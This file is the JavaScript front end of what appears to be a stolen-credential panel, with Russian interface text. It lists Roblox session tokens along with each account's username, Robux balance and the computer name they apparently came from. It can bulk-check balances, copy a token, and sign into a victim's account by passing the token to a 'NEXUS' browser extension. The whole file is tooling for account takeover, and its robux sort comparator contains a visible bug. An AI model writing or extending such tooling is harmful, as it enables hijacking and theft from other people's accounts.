// ── Страница токенов ──────────────────────────────────────────────────────────
if (!requireLogin()) throw new Error('redirect');

document.getElementById('sidebarSlot').innerHTML = renderHeader('tokens');
bindLogout();

let allTokens = [];
let sortMode = 'date';

async function loadTokens() {
  const container = document.getElementById('tokensContainer');
  container.innerHTML = '<div class="loading">⏳ Загрузка...</div>';
  try {
    const r = await apiFetch('/tokens-data');
    allTokens = await r.json();
    if (!Array.isArray(allTokens)) allTokens = [];
    updateStats();
    renderTokens();
  } catch (e) {
    if (e.message !== 'auth') {
      container.innerHTML = '<div class="empty"><span class="empty-icon">📭</span>Ошибка загрузки</div>';
      toast('Ошибка загрузки токенов', 'err');
    }
  }
}

function updateStats() {
  const total = allTokens.length;
  const valid = allTokens.filter(t => t.valid).length;
  const totalRobux = allTokens.reduce((s, t) => s + (t.valid && t.robux ? t.robux : 0), 0);
  document.getElementById('sTotal').textContent = total;
  document.getElementById('sValid').textContent = valid;
  document.getElementById('sTotalRobux').textContent = totalRobux.toLocaleString() + ' R$';
}

function renderTokens() {
  const container = document.getElementById('tokensContainer');

  if (allTokens.length === 0) {
    container.innerHTML = '<div class="empty"><span class="empty-icon">📭</span>База токенов пуста</div>';
    return;
  }

  let list = [...allTokens];
  if (sortMode === 'robux') {
    list.sort((a, b) => {
      const ar = (a.valid && a.robux) ? a.robux : -1;
      const br = (b.valid && a.robux) ? b.robux : -1;
      return br - ar;
    });
  } else {
    list.sort((a, b) => new Date(b.uploadedAt || 0) - new Date(a.uploadedAt || 0));
  }

  let html = '<table class="tokens-table" style="border-spacing: 0 8px;"><thead><tr><th>Статус</th><th>Ник</th><th>Robux</th><th>Токен</th><th>Компьютер</th><th>Действия</th></tr></thead><tbody>';

  for (const t of list) {
    const badgeClass = t.valid ? 'badge-valid' : 'badge-invalid';
    const statusText = t.valid ? '✅ Рабочий' : '❌ ' + (t.error || 'Невалид');
    const tokenSnippet = t.security ? escapeHtml(t.security.substring(0, 20)) + '...' : '—';
    const tokenFull = escapeHtml(t.security || '');
    const fileId = escapeHtml(t.file || '');

    html += '<tr>';
    html += '<td style="border-left: 1px solid var(--border); border-top-left-radius: var(--radius-lg); border-bottom-left-radius: var(--radius-lg);"><span class="badge ' + badgeClass + '">' + statusText + '</span></td>';
    html += '<td><strong>' + escapeHtml(t.username || '—') + '</strong></td>';
    
    const rbxText = t.valid && t.robux !== undefined ? t.robux.toLocaleString() + ' R$' : '—';
    const rbxColor = t.valid && t.robux > 0 ? '#fbbf24' : 'var(--text-muted)';
    const rbxGlow = t.valid && t.robux > 0 ? 'text-shadow: 0 0 15px rgba(251, 191, 36, 0.5); font-weight: 800;' : 'font-weight: 600;';
    html += '<td><span style="color: ' + rbxColor + '; ' + rbxGlow + ' font-size: 1.1rem;">' + rbxText + '</span></td>';
    
    html += '<td><div class="token-cell">' + tokenSnippet + '</div></td>';
    html += '<td><div style="font-size: 0.85rem; color: var(--text-secondary);"><span style="margin-right: 5px;">💻</span>' + escapeHtml(t.computer || '—') + '</div></td>';
    html += '<td style="border-right: 1px solid var(--border); border-top-right-radius: var(--radius-lg); border-bottom-right-radius: var(--radius-lg);"><div style="display:flex; gap:0.5rem; flex-wrap:wrap;">';
    
    html += '<button class="copy-btn" onclick="checkSingle(\'' + fileId.replace(/'/g, "\\'") + '\')" style="font-size:0.75rem; padding: 0.4rem 0.8rem; background:rgba(245,158,11,0.1); color:var(--warning); border:1px solid rgba(245,158,11,0.25); border-radius: 6px; transition: all 0.2s;">💰 Проверить</button>';
    if (t.security) {
      html += '<button class="copy-btn" onclick="copyText(\'' + tokenFull.replace(/'/g, "\\'") + '\')" style="font-size:0.75rem; padding: 0.4rem 0.8rem; border-radius: 6px; transition: all 0.2s;">📋 Копировать</button>';
      let loginBtnText = '👤 Войти';
      const lastLogin = localStorage.getItem('login_' + fileId);
      if (lastLogin) {
        const d = new Date(parseInt(lastLogin));
        loginBtnText = '👤 Заходил ' + d.toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'}) + ' ' + d.toLocaleDateString();
      }
      html += '<button class="copy-btn" onclick="loginToRoblox(\'' + tokenFull.replace(/'/g, "\\'") + '\', this, \'' + fileId.replace(/'/g, "\\'") + '\')" style="font-size:0.75rem; padding: 0.4rem 0.8rem; background:rgba(16,185,129,0.1); color:var(--success); border:1px solid rgba(16,185,129,0.25); border-radius: 6px; transition: all 0.2s; box-shadow: 0 0 10px rgba(16,185,129,0.1);">' + loginBtnText + '</button>';
    }
    html += '</div></td>';
    html += '</tr>';
  }

  html += '</tbody></table>';
  container.innerHTML = html;
}

// ── Проверить один токен ──────────────────────────────────────────────────────
async function checkSingle(filename) {
  toast('⏳ Проверка...');
  try {
    const r = await apiFetch('/robux-check-file', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ filename })
    });
    const info = await r.json();
    // Обновляем локальные данные
    const idx = allTokens.findIndex(t => t.file === filename);
    if (idx >= 0) {
      allTokens[idx] = { ...allTokens[idx], ...info };
      updateStats();
      renderTokens();
    }
    if (info.valid) {
      toast('💰 ' + (info.robux ? info.robux.toLocaleString() + ' R$' : 'OK'));
    } else {
      toast('❌ ' + (info.error || 'Невалид'), 'err');
    }
  } catch (e) {
    if (e.message !== 'auth') toast('Ошибка проверки', 'err');
  }
}

// ── Проверить все ─────────────────────────────────────────────────────────────
document.getElementById('btnCheckAll').addEventListener('click', async function() {
  const btn = this;
  btn.disabled = true;
  btn.textContent = '⏳ Проверка...';
  try {
    const r = await apiFetch('/robux-bulk', { method: 'POST' });
    const results = await r.json();
    if (Array.isArray(results)) {
      allTokens = results;
      updateStats();
      renderTokens();
      const valid = results.filter(r => r.valid).length;
      toast('✅ Проверено: ' + valid + '/' + results.length + ' рабочих');
    }
  } catch (e) {
    if (e.message !== 'auth') toast('Ошибка проверки', 'err');
  }
  btn.disabled = false;
  btn.textContent = '✓ Проверить все';
});

// ── Копирование ───────────────────────────────────────────────────────────────
function copyText(text) {
  if (!text) return;
  navigator.clipboard.writeText(text).then(() => toast('📋 Скопировано')).catch(() => {
    const ta = document.createElement('textarea');
    ta.value = text;
    document.body.appendChild(ta);
    ta.select();
    document.execCommand('copy');
    document.body.removeChild(ta);
    toast('📋 Скопировано');
  });
}

// ── Вход в Roblox по токену ───────────────────────────────────────────────────
function loginToRoblox(token, btn, fileId) {
  if (!token) return;
  btn.textContent = '⏳...';
  btn.disabled = true;

  function handler(e) {
    if (e.data && e.data.type === 'nexus-login-response') {
      window.removeEventListener('message', handler);
      if (e.data.ok) {
        if (fileId) {
          localStorage.setItem('login_' + fileId, Date.now());
          const d = new Date();
          btn.textContent = '👤 Заходил ' + d.toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'}) + ' ' + d.toLocaleDateString();
        } else {
          btn.textContent = '👤 Войти';
        }
        btn.disabled = false;
        toast('✅ Вход выполнен, открываем Roblox...');
      } else {
        restoreBtnText();
        toast('⚠️ Установи расширение NEXUS для входа', 'err');
      }
    }
  }

  function restoreBtnText() {
    const lastLogin = fileId ? localStorage.getItem('login_' + fileId) : null;
    if (lastLogin) {
      const d = new Date(parseInt(lastLogin));
      btn.textContent = '👤 Заходил ' + d.toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'}) + ' ' + d.toLocaleDateString();
    } else {
      btn.textContent = '👤 Войти';
    }
    btn.disabled = false;
  }

  window.addEventListener('message', handler);
  window.postMessage({ type: 'nexus-login', token }, '*');
  setTimeout(() => {
    window.removeEventListener('message', handler);
    restoreBtnText();
    toast('⚠️ Установи расширение NEXUS для входа', 'err');
  }, 800);
}

// ── Сортировка ────────────────────────────────────────────────────────────────
document.getElementById('btnSortDate').addEventListener('click', function() {
  sortMode = 'date';
  this.classList.add('active');
  document.getElementById('btnSortRobux').classList.remove('active');
  renderTokens();
});

document.getElementById('btnSortRobux').addEventListener('click', function() {
  sortMode = 'robux';
  this.classList.add('active');
  document.getElementById('btnSortDate').classList.remove('active');
  renderTokens();
});

loadTokens();
